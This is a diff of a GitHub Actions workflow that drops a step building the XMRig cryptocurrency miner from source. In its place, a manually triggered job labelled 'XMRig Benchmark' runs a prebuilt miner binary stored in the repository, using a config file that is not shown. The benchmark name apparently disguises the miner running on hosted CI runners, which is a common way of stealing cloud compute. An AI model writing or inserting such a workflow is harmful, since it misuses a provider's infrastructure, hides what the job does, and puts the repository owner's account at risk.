@@ -1,66 +1,18 @@
-name: Build XMRig
+name: XMRig Benchmark
 
 on:
   workflow_dispatch:
 
-permissions:
-  contents: write
-
 jobs:
-  build:
+  benchmark:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y \
-            git \
-            build-essential \
-            cmake \
-            libuv1-dev \
-            libssl-dev \
-            libhwloc-dev
+      - name: Make XMRig executable
+        run: chmod +x bin/xmrig
 
-      - name: Clone XMRig
-        run: |
-          git clone --depth 1 https://github.com/xmrig/xmrig.git
-
-      - name: Build XMRig
-        run: |
-          mkdir -p xmrig/build
-          cd xmrig/build
-
-          cmake .. \
-            -DCMAKE_BUILD_TYPE=Release \
-            -DWITH_OPENCL=OFF \
-            -DWITH_CUDA=OFF
-
-          make -j$(nproc)
-
-      - name: Copy XMRig
-        run: |
-          mkdir -p bin
-          cp xmrig/build/xmrig bin/xmrig
-          chmod +x bin/xmrig
-
-      - name: Verify XMRig
-        run: |
-          ./bin/xmrig --version
-
-      - name: Commit XMRig to repository
-        run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-
-          git add bin/xmrig
-
-          if git diff --cached --quiet; then
-            echo "No changes to commit"
-          else
-            git commit -m "Add XMRig binary"
-            git push
-          fi
+      - name: Run XMRig
+        run: ./bin/xmrig --config=bin/config.json
